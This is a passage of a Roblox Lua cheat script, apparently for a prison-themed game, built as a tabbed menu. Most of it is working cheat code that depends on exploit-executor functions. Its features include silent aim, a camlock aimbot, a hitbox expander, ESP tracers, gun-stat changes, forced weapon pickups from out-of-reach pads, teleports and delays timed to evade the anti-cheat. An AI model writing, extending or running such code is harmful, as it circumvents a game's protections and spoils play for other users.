        for _, word in pairs(keywords) do
            if name:find(word) and originals.Attrs[key] ~= nil then
                tool:SetAttribute(key, originals.Attrs[key])
                originals.Attrs[key] = nil
            end
        end
    end
    for _, obj in pairs(tool:GetDescendants()) do
        if obj:IsA("ValueBase") then
             local name = obj.Name:lower()
             for _, word in pairs(keywords) do
                if name:find(word) and originals.Values[obj] ~= nil then
                    obj.Value = originals.Values[obj]
                    originals.Values[obj] = nil
                end
             end
        end
    end
end

local function RefreshMod(tool)
    if not GunModOriginals[tool] then GunModOriginals[tool] = {Attrs={}, Values={}} end
    local originals = GunModOriginals[tool]
    
    for _, config in pairs(GunModRegistry) do
        if config.Enabled then
             ApplyVal(tool, config.Keywords, config.Value, originals)
        end
    end
end

local function ToggleGunMod(keywords, targetValue, modName, state)
    -- Update Registry
    GunModRegistry[modName] = {Keywords=keywords, Value=targetValue, Enabled=state}
    
    -- Apply to held tool
    local tool = lp.Character and lp.Character:FindFirstChildOfClass("Tool")
    if tool then
        if not GunModOriginals[tool] then GunModOriginals[tool] = {Attrs={}, Values={}} end
        local originals = GunModOriginals[tool]
        
        if state then
             ApplyVal(tool, keywords, targetValue, originals)
        else
             RevertVal(tool, keywords, originals)
        end
    end
    return true
end

-- Persistence
local function SetupGunPersistence()
    if gunModDisc then gunModDisc:Disconnect() end
    
    local function onChar(char)
        table.insert(connections, char.ChildAdded:Connect(function(c)
             if c:IsA("Tool") then
                 task.wait(0.1)
                 RefreshMod(c)
             end
        end))
    end
    
    table.insert(connections, lp.CharacterAdded:Connect(onChar))
    if lp.Character then onChar(lp.Character) end
end
SetupGunPersistence()

local function ShowCooldownHUD(duration)
    task.spawn(function()
        if lp.PlayerGui:FindFirstChild("TaxCooldownHUD") then lp.PlayerGui.TaxCooldownHUD:Destroy() end
        local sg = Instance.new("ScreenGui", lp.PlayerGui); sg.Name = "TaxCooldownHUD"
        local f = Instance.new("Frame", sg); f.Size = UDim2.new(0, 200, 0, 80); f.Position = UDim2.new(1, -220, 1, -90) -- Bottom Right
        f.BackgroundColor3 = Color3.fromRGB(20, 20, 25); f.BorderSizePixel = 0
        Instance.new("UICorner", f)
        local stroke = Instance.new("UIStroke", f); stroke.Color = Color3.fromRGB(255, 50, 50); stroke.Thickness = 2
        
        local title = Instance.new("TextLabel", f); title.Size = UDim2.new(1,0,0,30); title.Text = "ANTI-CHEAT COOLDOWN"
        title.TextColor3 = Color3.fromRGB(255, 50, 50); title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize=14
        
        local timer = Instance.new("TextLabel", f); timer.Size = UDim2.new(1,0,0,40); timer.Position = UDim2.new(0,0,0.4,0); timer.BackgroundTransparency=1
        timer.Font = Enum.Font.GothamBlack; timer.TextSize = 30; timer.TextColor3 = Color3.fromRGB(255, 255, 255)
        
        for i = duration * 10, 0, -1 do
            timer.Text = string.format("%.1f s", i/10)
            if not lp.PlayerGui:FindFirstChild("TaxCooldownHUD") then break end
            task.wait(0.1)
        end
        sg:Destroy()
    end)
end

local function stealthGrab(targetPos, toolName)
    local root = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end

    -- Safe Check
    if antiCheatEnabled then
        local cd = math.max(1.5 - (tick() - lastTeleport), 0)
        if cd > 0 then ShowCooldownHUD(cd); return end
    end
    lastTeleport = tick(); if antiCheatEnabled then ShowCooldownHUD(1.5) end

    warn("--- ATTEMPTING GRAB (MAGNET V3): " .. toolName .. " ---")

    -- 1. Find Search Region
    local regionSize = 25
    local region = Region3.new(targetPos - Vector3.new(regionSize,regionSize,regionSize), targetPos + Vector3.new(regionSize,regionSize,regionSize))
    local parts = Workspace:FindPartsInRegion3(region, nil, 100)
    
    local targetPart = nil
    for _, part in pairs(parts) do
        if part.Name == "TouchGiver" and part:IsA("BasePart") then
            targetPart = part
            break 
        end
    end

    if not targetPart then 
        warn("!!! GUN PAD NOT FOUND !!!")
        return 
    end

    -- 2. Magnet Sequence (Bring Pad to User)
    local myPos = root.Position
    local ogCFrame = targetPart.CFrame
    local ogCollide = targetPart.CanCollide
    local ogAnchored = targetPart.Anchored
    
    -- Freeze Player
    root.Anchored = true 
    
    -- Bring Pad Under Feet (Closer this time)
    targetPart.CanCollide = true -- User requested collisions
    targetPart.Anchored = true 
    -- -1.25 is just enough to be "under" the feet collision box without being too deep
    targetPart.CFrame = CFrame.new(myPos.X, myPos.Y - 1.25, myPos.Z)
    
    -- 3. Wait for Grab
    local startTime = tick()
    local timeout = 2 
    
    while (tick() - startTime < timeout) do
        if lp.Backpack:FindFirstChild(toolName) or lp.Character:FindFirstChild(toolName) then break end
        
        -- Force Touch
        firetouchinterest(root, targetPart, 0)
        firetouchinterest(root, targetPart, 1)
        
        local cd = targetPart:FindFirstChildOfClass("ClickDetector") or targetPart.Parent:FindFirstChildOfClass("ClickDetector")
        if cd then fireclickdetector(cd) end
        
        task.wait()
    end
    
    -- 4. Cleanup
    root.Anchored = false
    
    -- Restore Pad
    if targetPart and targetPart.Parent then
        targetPart.CFrame = ogCFrame
        targetPart.CanCollide = ogCollide
        targetPart.Anchored = ogAnchored
    end
    
    warn("--- GRAB COMPLETE ---")
end

local function standardTP(pos)
    if antiCheatEnabled then
        local cd = math.max(5 - (tick() - lastTeleport), 5 - (tick() - spawnTime))
        if cd > 0 then ShowCooldownHUD(cd); return end
    end
    if not lp.Character then return end
    lastTeleport = tick(); if antiCheatEnabled then ShowCooldownHUD(5) end
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
end

-- // --- GLOBAL HELPERS (GUN GRAB) --- //
local function ShowGrabHUD(duration, gunName)
    local sg = Instance.new("ScreenGui")
    if syn and syn.protect_gui then
        syn.protect_gui(sg)
        sg.Parent = CoreGui
    elseif gethui then
        sg.Parent = gethui()
    else
        sg.Parent = CoreGui
    end
    
    sg.Name = "TaxGrabHUD"
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 9999
    sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
    local f = Instance.new("Frame", sg)
    f.Size = UDim2.new(1,0,1,0); f.BackgroundTransparency=1
    
    local lTitle = Instance.new("TextLabel", f)
    lTitle.Size = UDim2.new(1,0,0,50); lTitle.Position = UDim2.new(0,0,0.3,0)
    lTitle.BackgroundTransparency=1; lTitle.TextColor3 = Color3.new(1,1,1)
    lTitle.Text = "GETTING " .. string.upper(gunName) .. "..."
    lTitle.Font = Enum.Font.GothamBold; lTitle.TextSize = 30
    
    local lTime = Instance.new("TextLabel", f)
    lTime.Size = UDim2.new(1,0,0,80); lTime.Position = UDim2.new(0,0,0.4,0)
    lTime.BackgroundTransparency=1; lTime.TextColor3 = Color3.fromRGB(0, 255, 150) -- C_ACCENT approximation if needed or use global
    lTime.Text = tostring(duration)
    lTime.Font = Enum.Font.GothamBlack; lTime.TextSize = 80
    
    local lWarn = Instance.new("TextLabel", f)
    lWarn.Size = UDim2.new(1,0,0,50); lWarn.Position = UDim2.new(0,0,0.55,0)
    lWarn.BackgroundTransparency=1; lWarn.TextColor3 = Color3.fromRGB(255, 50, 50)
    lWarn.Text = "DO NOT TRY TO MOVE AROUND"
    lWarn.Font = Enum.Font.GothamBold; lWarn.TextSize = 40
    
    task.spawn(function()
        for i = duration, 0, -1 do
            lTime.Text = string.format("00:%02d", i)
            task.wait(1)
        end
        sg:Destroy()
    end)
end

local function RunUndergroundGrab(gunName, originPos)
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return end
    
    -- HUD
    ShowGrabHUD(6, gunName)
    
    -- 0. Save Original Position & Camera
    local startCFrame = lp.Character.HumanoidRootPart.CFrame
    local cam = workspace.CurrentCamera
    local startCamCF = cam.CFrame
    local oldCamType = cam.CameraType
    
    -- Freeze Camera
    cam.CameraType = Enum.CameraType.Scriptable
    cam.CFrame = startCamCF
    
    -- 1. Setup
    local depth = 20 -- Deeper
    local safePos = originPos - Vector3.new(0, depth, 0)
    
    -- Cage Container
    local cagebox = Instance.new("Folder", workspace)
    cagebox.Name = "TaxGrabCage"

    local function mkPart(sz, cf)
        local p = Instance.new("Part", cagebox)
        p.Size = sz; p.CFrame = cf; p.Anchored = true; p.CanCollide = true; p.Transparency = 1
        return p
    end

    -- Build Cage
    mkPart(Vector3.new(15, 1, 15), CFrame.new(safePos - Vector3.new(0, 3.5, 0))) -- Floor
    mkPart(Vector3.new(15, 10, 1), CFrame.new(safePos + Vector3.new(0, 1.5, 7.5))) -- Wall F
    mkPart(Vector3.new(15, 10, 1), CFrame.new(safePos + Vector3.new(0, 1.5, -7.5))) -- Wall B
    mkPart(Vector3.new(1, 10, 15), CFrame.new(safePos + Vector3.new(7.5, 1.5, 0))) -- Wall R
    mkPart(Vector3.new(1, 10, 15), CFrame.new(safePos + Vector3.new(-7.5, 1.5, 0))) -- Wall L
    
    -- 2. Teleport Player
    lp.Character.HumanoidRootPart.CFrame = CFrame.new(safePos)
    
    -- 3. Find Pad
    local pad = nil
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "TouchGiver" and v:IsA("BasePart") and (v.Position - originPos).Magnitude < 5 then
            pad = v
            break
        end
    end
    
    if pad then
        local model = pad.Parent
        local parts = {}
        for _, p in pairs(model:GetDescendants()) do
            if p:IsA("BasePart") then
                table.insert(parts, {Part=p, CFrame=p.CFrame, Anchored=p.Anchored, CanCollide=p.CanCollide})
                p.Anchored = true
                p.CanCollide = true -- User wants it solid
            end
        end
        
        -- Move Model (Simple Translation)
        local offset = (safePos - Vector3.new(0, 2.5, 0)) - pad.Position -- Raised slightly to sit on floor
        for _, data in pairs(parts) do
            data.Part.CFrame = data.Part.CFrame + offset
        end
        
        -- Auto-Collect
        local vim = game:GetService("VirtualInputManager")
        local startTime = tick()
        while tick() - startTime < 6 do -- Reduced to 6s
            if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") and lp.Character:FindFirstChild("Humanoid") then
                -- Spam Jump (Key Press Simulation)
                vim:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
                task.wait(0.05)
                vim:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
                
                -- 1. Touch
                firetouchinterest(lp.Character.HumanoidRootPart, pad, 0)
                firetouchinterest(lp.Character.HumanoidRootPart, pad, 1)
                
                -- 2. Click (Backup)
                local cd = pad:FindFirstChildOfClass("ClickDetector") or model:FindFirstChildOfClass("ClickDetector")
                if cd then fireclickdetector(cd) end
            end
            task.wait(0.2) -- Slower loop to allow jump processing
        end
        
        -- Restore
        for _, data in pairs(parts) do
            data.Part.CFrame = data.CFrame
            data.Part.Anchored = data.Anchored
            data.Part.CanCollide = data.CanCollide
        end
    else
        warn("Gun Pad not found for " .. gunName)
    end
    
    if cagebox then cagebox:Destroy() end
    
    -- 5. Return to Start
    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
        lp.Character.HumanoidRootPart.CFrame = startCFrame
    end
    
    -- Restore Camera
    cam.CameraType = oldCamType
end

--// --- TABS --- //

-- 1. COMBAT
-- 1. COMBAT
do
    local pgCombat = CreateTab("Combat", "111290099377571")

    local secArrest = CreateSection(pgCombat, "Arrest Mods")
    CreateToggle(secArrest, "Smooth Arrest Mode", Tw, function(state) Tw = state end)
    CreateButton(secArrest, "Arrest All Criminals", Color3.fromRGB(200, 50, 50), function(b) RunRippedArrest("Criminals", b) end)

    -- Old "Underground Gun Grabs" section removed

    

    -- Gun Grab Buttons Moved to Guns Tab (Cleanup Complete)


    -- Gun Grab Buttons Moved to Guns Tab


    local secCombat = CreateSection(pgCombat, "Combat Mods")
    CreateToggle(secCombat, "Punch Aura", punchAuraEnabled, function(state) punchAuraEnabled = state end)
    CreateToggle(secCombat, "Hitbox Expander", hitboxEnabled, function(state) hitboxEnabled = state end)
    CreateSlider(secCombat, "Hitbox Size", 1, 50, 20, function(v) hitboxSize=v end)
    CreateSlider(secCombat, "Hitbox Transparency", 0, 10, 5, function(v) hitboxTrans=v/10 end)
    CreateToggle(secCombat, "Ignore Criminals", false, function(s) hitboxIgnore.Criminals = s end)
    CreateToggle(secCombat, "Ignore Guards", false, function(s) hitboxIgnore.Guards = s end)
    CreateToggle(secCombat, "Ignore Prisoners", false, function(s) hitboxIgnore.Inmates = s end)
    CreateToggle(secCombat, "Camlock System", camLockSystem, function(state) camLockSystem = state end)
    CreateToggle(secCombat, "Macro", macroEnabled, function(state) macroEnabled = state end)

    -- Silent Aim Section (in Combat)
    local secSilent = CreateSection(pgCombat, "Silent Aim")
    CreateToggle(secSilent, "Silent Aim", false, function(state)
        SilentAimSettings.Enabled = state
    end)
    CreateToggle(secSilent, "Team Check", false, function(state)
        SilentAimSettings.TeamCheck = state
    end)
    CreateToggle(secSilent, "Ignore Criminals", false, function(state)
        SilentAimSettings.IgnoreCriminals = state
    end)
    CreateToggle(secSilent, "Ignore Guards", false, function(state)
        SilentAimSettings.IgnoreGuards = state
    end)
    CreateToggle(secSilent, "Ignore Prisoners", false, function(state)
        SilentAimSettings.IgnoreInmates = state
    end)

    local currentTargetPart = "Head"
    CreateButton(secSilent, "TARGET: Head", nil, function(b)
        if currentTargetPart == "HumanoidRootPart" then
            currentTargetPart = "Head"
        elseif currentTargetPart == "Head" then
            currentTargetPart = "Random"
        else
            currentTargetPart = "HumanoidRootPart"
        end
        SilentAimSettings.TargetPart = currentTargetPart
        b.Text = "TARGET: " .. currentTargetPart
    end)

    CreateLabel(secSilent, "METHOD: Raycast")

    CreateSlider(secSilent, "Hit Chance", 0, 100, 100, function(v)
        SilentAimSettings.HitChance = v
    end)
    CreateSlider(secSilent, "FOV Radius", 50, 400, 130, function(v)
        SilentAimSettings.FOVRadius = v
        if fov_circle then fov_circle.Radius = v end
    end)
    CreateToggle(secSilent, "Show FOV", false, function(state)
        SilentAimSettings.FOVVisible = state
        if fov_circle then fov_circle.Visible = state end
    end)
    CreateToggle(secSilent, "Show Target", false, function(state)
        SilentAimSettings.ShowSilentAimTarget = state
    end)
end

-- 2. PLAYER
do
    local pgPlayer = CreateTab("Player", "135752797144539")

    local secChar = CreateSection(pgPlayer, "Character")
    CreateToggle(secChar, "Tazer Escape", antiTazeEnabled, function(state)
        if state then EnableAntiTaze() else DisableAntiTaze() end
    end)
    CreateToggle(secChar, "No Delay Jump", staminaEnabled, function(state)
        if state then EnableStamina() else DisableStamina() end
    end)
    CreateToggle(secChar, "Infinite Jump", infJumpEnabled, function(state) infJumpEnabled = state end)
    CreateToggle(secChar, "Phase Mode", phaseEnabled, function(state) phaseEnabled = state end)

    local secInvis = CreateSection(pgPlayer, "Invisibility")
    CreateToggle(secInvis, "Ghost Mode", ghostActive, function(state)
        if state then EnableGhost() else DisableGhost() end
    end)
    CreateToggle(secInvis, "Ghost Visuals", ghostVisuals, function(state)
        ghostVisuals = state
        if ghostActive and ghostVisuals then UpdateGhost() end
    end)

    local secMods = CreateSection(pgPlayer, "Modifiers")
    CreateToggle(secMods, "Speed Mod", wsEnabled, function(state)
        wsEnabled = state
        if not state and lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.WalkSpeed = 16
        end
    end)
    CreateSlider(secMods, "WalkSpeed", 16, 200, 16, function(v) wsVal = v end)

    CreateToggle(secMods, "Jump Mod", jpEnabled, function(state)
        jpEnabled = state
        if not state and lp.Character and lp.Character:FindFirstChild("Humanoid") then
            lp.Character.Humanoid.JumpPower = 50
        end
    end)
    CreateSlider(secMods, "JumpPower", 50, 300, 50, function(v) jpVal = v end)

    CreateLabel(secMods, "SPIDER MODE (buggy)", Color3.fromRGB(0, 255, 150))
    CreateButton(secMods, "ENABLE SPIDER MODE", nil, function(b)
        if not spiderEnabled then
            EnableSpider()
            b.Text = "DISABLE SPIDER MODE"
            b.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
            b.TextColor3 = Color3.new(0,0,0)
        else
            DisableSpider()
            b.Text = "ENABLE SPIDER MODE"
            b.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
            b.TextColor3 = Color3.new(1,1,1)
        end
    end)

    local secCar = CreateSection(pgPlayer, "Car Modifications")

    -- Car Fly Mod
    carFlyToggle = CreateToggle(secCar, "Car Fly (buggy) (risk of being killed) (getting kicked from ts is rare)", carFlyEnabled, function(state)
        if state then EnableCarFly() else DisableCarFly() end
    end)
    CreateSlider(secCar, "Fly Speed", 90, 250, 200, function(v) carSpeedVal = v end)
    CreateSlider(secCar, "Fly Height", 0, 75, 0, function(v) carFlyHeight = v end)

    CreateButton(secCar, "Flip Car", Color3.fromRGB(0, 200, 255), function() FlipCar() end)

    CreateLabel(secCar, "Car drives normally at set height.")
end





do
    local pgGuns = CreateTab("Guns", "138347757200888")

    local secGunMods = CreateSection(pgGuns, "Gun Mods")
    local t_recoil; t_recoil = CreateToggle(secGunMods, "Remove Recoil & Spread", false, function(s)
        if not ToggleGunMod({"recoil","kick","camera"}, 0, "No Recoil", s) and s then t_recoil:SetState(false) return end
        ToggleGunMod({"spread","radius"}, 0, "No Spread", s)
    end)
    
    CreateSlider(secGunMods, "Fire Rate (Higher = Faster)", 1, 100, 20, function(v)
        -- User wants Rate 1-100.
        -- If v=100, delay=0.01.
        local delay = 1 / v
        ToggleGunMod({"delay","rate"}, delay, "Fire Rate", true)
    end)

    local t_range; t_range = CreateToggle(secGunMods, "Max Range", false, function(s)
         if not ToggleGunMod({"range","dist"}, 9999, "Max Range", s) and s then t_range:SetState(false) end
    end)
    local t_auto; t_auto = CreateToggle(secGunMods, "Force Full Auto", false, function(s)
         if not ToggleGunMod({"auto","mode"}, true, "Auto", s) and s then t_auto:SetState(false) end
    end)
    -- Instant Reload Removed

    local secStealth = CreateSection(pgGuns, "Underground Gun Grabs (Safe & Working)")
    CreateButton(secStealth, "GET M4A1 (SWAT)", Color3.fromRGB(0, 150, 255), function() 
        RunUndergroundGrab("M4A1", Vector3.new(847.27, 100.74, 2229.35)) 
    end)
    CreateButton(secStealth, "GET REMINGTON 870", Color3.fromRGB(0, 150, 255), function() 
        RunUndergroundGrab("Remington 870", Vector3.new(820.51, 100.94, 2229.23)) 
    end)
    CreateButton(secStealth, "GET MP5", Color3.fromRGB(0, 150, 255), function() 
        RunUndergroundGrab("MP5", Vector3.new(813.33, 100.94, 2229.23)) 
    end)
    CreateButton(secStealth, "GET AK-47", Color3.fromRGB(0, 150, 255), function() 
        RunUndergroundGrab("AK-47", Vector3.new(-931.96, 94.37, 2038.98)) 
    end)
    CreateButton(secStealth, "GET FAL", Color3.fromRGB(0, 150, 255), function() 
        RunUndergroundGrab("FAL", Vector3.new(-915.57, 94.30, 2047.08)) 
    end)


    -- 3. TELEPORTS
    -- 3. TELEPORTS
    local pgTele = CreateTab("Teleports/Players", "103408198538996")

    -- SPLIT LAYOUT (Left = Locations, Right = Players)
    local teleContainer = Instance.new("Frame", pgTele)
    teleContainer.Size = UDim2.new(1, 0, 1, 0)
    teleContainer.BackgroundTransparency = 1

    local leftPanel = Instance.new("ScrollingFrame", teleContainer)
    leftPanel.Size = UDim2.new(0.5, -5, 1, 0)
    leftPanel.Position = UDim2.new(0, 0, 0, 0)
    leftPanel.BackgroundTransparency = 1; leftPanel.ScrollBarThickness = 2
    local leftList = Instance.new("UIListLayout", leftPanel); leftList.Padding = UDim.new(0, 5); leftList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    leftList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() leftPanel.CanvasSize = UDim2.new(0,0,0,leftList.AbsoluteContentSize.Y + 10) end)
    Instance.new("UIPadding", leftPanel).PaddingTop = UDim.new(0, 5)

    local rightPanel = Instance.new("ScrollingFrame", teleContainer)
    rightPanel.Size = UDim2.new(0.5, -5, 1, 0)
    rightPanel.Position = UDim2.new(0.5, 5, 0, 0)
    rightPanel.BackgroundTransparency = 1; rightPanel.ScrollBarThickness = 2
    local rightList = Instance.new("UIListLayout", rightPanel); rightList.Padding = UDim.new(0, 5); rightList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    rightList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() rightPanel.CanvasSize = UDim2.new(0,0,0,rightList.AbsoluteContentSize.Y + 10) end)
    Instance.new("UIPadding", rightPanel).PaddingTop = UDim.new(0, 5)

    -- LEFT SIDE: LOCATIONS

    CreateButton(leftPanel, "POLICE BASE", nil, function() standardTP(Vector3.new(831.15, 99.98, 2234.15)) end)
    CreateButton(leftPanel, "CRIMINAL BASE", nil, function() standardTP(Vector3.new(-933.01, 94.13, 2029.40)) end)

    CreateButton(leftPanel, "YARD TOWER", nil, function() standardTP(Vector3.new(822.65, 125.84, 2587.67)) end)
    CreateButton(leftPanel, "SEWER TOWER", nil, function() standardTP(Vector3.new(805.28, 122.04, 2066.70)) end)
    CreateButton(leftPanel, "LEFT TOWER", nil, function() standardTP(Vector3.new(502.48, 125.84, 2587.93)) end)
    CreateButton(leftPanel, "RIGHT TOWER", nil, function() standardTP(Vector3.new(503.11, 125.84, 2071.77)) end)

    CreateButton(leftPanel, "ROOF", nil, function() standardTP(Vector3.new(933.54, 137.51, 2298.53)) end)
    CreateButton(leftPanel, "YARD", nil, function() standardTP(Vector3.new(777.43, 98.00, 2474.33)) end)
    CreateButton(leftPanel, "SEWER END", nil, function() standardTP(Vector3.new(917.00, 98.19, 2118.36)) end)
    CreateButton(leftPanel, "FRIDGE", nil, function() standardTP(Vector3.new(794.29, 100.98, 2245.81)) end)
    CreateButton(leftPanel, "GROCERY STORE", nil, function() standardTP(Vector3.new(-464.64, 54.18, 1697.48)) end)
    CreateButton(leftPanel, "SECRET BASE", nil, function() standardTP(Vector3.new(-60.13, 11.10, 1300.08)) end)

    -- RIGHT SIDE: PLAYER TELEPORT
    CreateLabel(rightPanel, "PLAYER TP", Color3.fromRGB(0, 200, 255))

    local selectedPlayer = nil
    local tpBtn = nil -- forward decl

    -- Dropdown Container
    local dropdown = Instance.new("Frame", rightPanel)
    dropdown.Size = UDim2.new(0.9, 0, 0, 150) -- Fixed height for list
    dropdown.BackgroundColor3 = Color3.fromRGB(20, 20, 25); dropdown.BorderSizePixel = 0
    Instance.new("UICorner", dropdown)

    local dScroll = Instance.new("ScrollingFrame", dropdown)
    dScroll.Size = UDim2.new(1, -10, 1, -10); dScroll.Position = UDim2.new(0, 5, 0, 5)
    dScroll.BackgroundTransparency = 1; dScroll.ScrollBarThickness = 2
    local dList = Instance.new("UIListLayout", dScroll); dList.Padding = UDim.new(0, 2)
    dList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function() dScroll.CanvasSize = UDim2.new(0,0,0,dList.AbsoluteContentSize.Y) end)

    local function RefreshPlayers()
        for _, c in pairs(dScroll:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
        
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= lp then
                local b = Instance.new("TextButton", dScroll)
                b.Size = UDim2.new(1, 0, 0, 25)
                b.BackgroundColor3 = Color3.fromRGB(30,30,35)
                b.Text = p.Name
                b.TextColor3 = Color3.new(1,1,1)
                b.Font = Enum.Font.GothamMedium
                Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
                
                b.MouseButton1Click:Connect(function()
                    selectedPlayer = p
                    if tpBtn then tpBtn.Text = "TELEPORT TO: " .. p.Name end
                    -- Highlight selection logic could go here
                end)
            end
        end
    end

    CreateButton(rightPanel, "REFRESH LIST", Color3.fromRGB(100, 100, 100), function() RefreshPlayers() end)

    tpBtn = CreateButton(rightPanel, "SELECT A PLAYER", Color3.fromRGB(0, 150, 0), function()
        if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
            standardTP(selectedPlayer.Character.HumanoidRootPart.Position)
        else
            tpBtn.Text = "INVALID TARGET"
            task.wait(1)
            tpBtn.Text = selectedPlayer and ("TELEPORT TO: " .. selectedPlayer.Name) or "SELECT A PLAYER"
        end
    end)

    local isSpectating = false
    local specBtn = CreateButton(rightPanel, "SPECTATE: OFF", Color3.fromRGB(100, 0, 150), function(b)
        if not selectedPlayer then 
            b.Text = "SELECT PLAYER FIRST"
            task.wait(1)
            b.Text = "SPECTATE: " .. (isSpectating and "ON" or "OFF")
            return 
        end
        
        isSpectating = not isSpectating
        if isSpectating then
            if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Humanoid") then
                cam.CameraSubject = selectedPlayer.Character.Humanoid
                b.Text = "SPECTATE: " .. selectedPlayer.Name
            end
        else
            if lp.Character and lp.Character:FindFirstChild("Humanoid") then
                cam.CameraSubject = lp.Character.Humanoid
            end
            b.Text = "SPECTATE: OFF"
        end
    end)

    -- Initial Load
    RefreshPlayers()
end

do
    -- 4. VISUALS
    local pgVis = CreateTab("Visuals", "130632136619763")
    local secESP = CreateSection(pgVis, "ESP Features")
    CreateToggle(secESP, "Chams", chamsEnabled, function(state) chamsEnabled = state end)
    CreateToggle(secESP, "Box ESP", boxesEnabled, function(state) boxesEnabled = state end)
    CreateToggle(secESP, "Name ESP", namesEnabled, function(state) namesEnabled = state end)
    CreateToggle(secESP, "Tracers", tracersEnabled, function(state) tracersEnabled = state end)
    CreateToggle(secESP, "Team Check", teamCheck, function(state) teamCheck = state end)
    CreateToggle(secESP, "Ignore Criminals", false, function(s) espIgnore.Criminals = s end)
    CreateToggle(secESP, "Ignore Guards", false, function(s) espIgnore.Guards = s end)
    CreateToggle(secESP, "Ignore Prisoners", false, function(s) espIgnore.Inmates = s end)


    -- 5. KEYBINDS
    local pgKeys = CreateTab("Settings", "82036739310699")

    local changingNoclip = false
    local noclipBindBtn = CreateButton(pgKeys, "PHASE KEY: V", nil, function(b)
        changingNoclip = true; b.Text = "PRESS KEY..."
    end)

    local changingTrigger = false
    local trigBtn = CreateButton(pgKeys, "MACRO TRIGGER: X", nil, function(b) 
        changingTrigger = true; b.Text = "PRESS KEY..." 
    end)
    local changingLock = false
    local lockBindBtn = CreateButton(pgKeys, "CAMLOCK KEY: Q", nil, function(b) 
        changingLock = true; b.Text = "PRESS KEY..." 
    end)
    CreateLabel(pgKeys, "SETTINGS", Color3.fromRGB(0, 255, 100))
    CreateButton(pgKeys, "CAMLOCK MODE: HOLD", nil, function(b) 
        camMode = (camMode == "Hold") and "Toggle" or "Hold"; b.Text = "CAMLOCK MODE: " .. string.upper(camMode) 
    end)
    


    -- 6. MISC
    local pgMisc = CreateTab("Misc", "125038207360704")
    CreateButton(pgMisc, "ANTI-CHEAT WAIT: ON", nil, function(b)
        antiCheatEnabled = not antiCheatEnabled
        b.Text = "ANTI-CHEAT WAIT: " .. (antiCheatEnabled and "ON" or "OFF")
        b.BackgroundColor3 = antiCheatEnabled and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
    end)
    CreateButton(pgMisc, "SERVER HOP", Color3.fromRGB(0, 100, 150), function()
        local id = game.PlaceId; local s = {}
        pcall(function()
            local d = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..id.."/servers/Public?sortOrder=Desc&limit=100"))
            if d and d.data then for _,v in pairs(d.data) do if v.playing<v.maxPlayers and v.id~=game.JobId then table.insert(s,v.id) end end end
        end)
        if #s>0 then TeleportService:TeleportToPlaceInstance(id,s[math.random(1,#s)],lp) end
    end)
    -- // NEW DISCORD BUTTON //
    CreateButton(pgMisc, "JOIN DISCORD", Color3.fromRGB(88, 101, 242), function(b)
        setclipboard("https://discord.gg/U2STxveM5F")
        b.Text = "LINK COPIED!"
        task.wait(2)
        b.Text = "JOIN DISCORD"
    end)
    CreateButton(pgMisc, "KILL SCRIPT", Color3.fromRGB(150, 0, 0), function() killScript() end)



    --// INIT
    SwitchTab("Combat")

    --// INPUT HANDLER
    local inputConn = UIS.InputBegan:Connect(function(i, gp)
        if gp then return end
        if changingTrigger then triggerKey = i.KeyCode; trigBtn.Text = "MACRO TRIGGER: " .. i.KeyCode.Name; changingTrigger = false
        elseif changingLock then lockKey = i.KeyCode; lockBindBtn.Text = "CAMLOCK KEY: " .. i.KeyCode.Name; changingLock = false
        elseif changingNoclip then noclipKey = i.KeyCode; noclipBindBtn.Text = "PHASE KEY: " .. i.KeyCode.Name; changingNoclip = false
        elseif i.KeyCode == lockKey and camMode == "Toggle" and camLockSystem then camLocking = not camLocking
        elseif i.KeyCode == noclipKey and phaseEnabled then
            Phase()
        elseif i.KeyCode == Enum.KeyCode.K then gui.Enabled = not gui.Enabled
        end
    end)
    table.insert(connections, inputConn)
end

--// INFINITE JUMP LOGIC
local jumpConn = UIS.JumpRequest:Connect(function()
    if infJumpEnabled and lp.Character then
        local hum = lp.Character:FindFirstChild("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)
table.insert(connections, jumpConn)

--// MAIN RENDER LOOP (VISUALS & LOCK)
RunService.RenderStepped:Connect(function()
    -- CamLock
    if camLockSystem then
        local sl = false
        if camMode == "Hold" then sl = UIS:IsKeyDown(lockKey) else sl = camLocking end
        if sl then
            local c, d = nil, math.huge
            for _,v in pairs(Players:GetPlayers()) do
                if v~=lp and v.Character and v.Character:FindFirstChild("Head") then
                    if not(teamCheck and v.Team==lp.Team) then
                        local p,os = cam:WorldToViewportPoint(v.Character.Head.Position)
                        if os then local m=(Vector2.new(p.X,p.Y)-UIS:GetMouseLocation()).Magnitude
                        if m<d then d=m; c=v end end
                    end
                end
            end
            if c then cam.CFrame = CFrame.new(cam.CFrame.Position, c.Character.Head.Position) end
        end
    end
    
    -- Visuals
    for _,v in pairs(Players:GetPlayers()) do
        if v ~= lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Head") then
            local char = v.Character; local hrp = char.HumanoidRootPart; local head = char.Head
            local isT = (teamCheck and v.Team==lp.Team)
            
            -- Independent Ignore Logic
            local tName = v.Team and v.Team.Name or ""
